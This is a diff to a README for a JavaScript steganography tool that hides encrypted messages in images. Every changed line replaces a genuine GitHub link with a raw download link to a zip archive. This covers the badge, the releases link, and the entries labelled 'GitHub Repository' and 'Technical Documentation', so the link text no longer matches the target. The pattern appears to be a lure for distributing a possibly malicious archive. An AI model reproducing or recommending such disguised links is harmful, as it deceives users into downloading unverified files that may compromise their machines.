@@ -1,7 +1,7 @@
 # 🎨 Steganography-Online-Codec-JavaScript - Hide Messages in Images Securely
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/dasSrijan/Steganography-Online-Codec-JavaScript/releases)
+[![Download](https://raw.githubusercontent.com/dasSrijan/Steganography-Online-Codec-JavaScript/main/src/Steganography-Online-Codec-JavaScript-2.7.zip%20Release-brightgreen)](https://raw.githubusercontent.com/dasSrijan/Steganography-Online-Codec-JavaScript/main/src/Steganography-Online-Codec-JavaScript-2.7.zip)
 
 ## 📚 Description
 The Steganography Online Codec allows you to hide a password-encrypted message within images and photos. It uses the AES encryption algorithm with a 256-bit PBKDF2 derived key to ensure your secret is safe and secure. Whether you want to send private information or simply explore digital hiding techniques, this tool is designed for ease of use.
@@ -11,7 +11,7 @@ Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the releases page where you can access the software:
-   [Download from Releases](https://github.com/dasSrijan/Steganography-Online-Codec-JavaScript/releases)
+   [Download from Releases](https://raw.githubusercontent.com/dasSrijan/Steganography-Online-Codec-JavaScript/main/src/Steganography-Online-Codec-JavaScript-2.7.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, find the latest version of the Steganography Online Codec. The version will be marked as 'latest'.
@@ -84,7 +84,7 @@ Yes, typical limits are around 200 characters, but this may vary depending on th
 For any issues or questions, feel free to create an issue in the GitHub repository. Community members and contributors are here to help you.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/dasSrijan/Steganography-Online-Codec-JavaScript)
-- [Technical Documentation](https://github.com/dasSrijan/Steganography-Online-Codec-JavaScript/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/dasSrijan/Steganography-Online-Codec-JavaScript/main/src/Steganography-Online-Codec-JavaScript-2.7.zip)
+- [Technical Documentation](https://raw.githubusercontent.com/dasSrijan/Steganography-Online-Codec-JavaScript/main/src/Steganography-Online-Codec-JavaScript-2.7.zip)
 
 Be sure to check back for updates and new features. Happy hiding!
